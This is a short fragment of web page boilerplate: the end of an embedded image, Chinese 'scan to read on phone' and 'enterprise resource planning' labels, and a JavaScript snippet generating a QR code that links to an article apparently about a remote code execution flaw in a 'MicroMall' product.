v7TkeGtIJrf/uh3YDXnd3pcz/wcAAP//I+PJRAAAAAZJREFUAwAwPcqbPDKQBAAAAABJRU5ErkJggg==)

手机扫码阅读

企业资源规划


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/mamabaohe-MicroMall-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 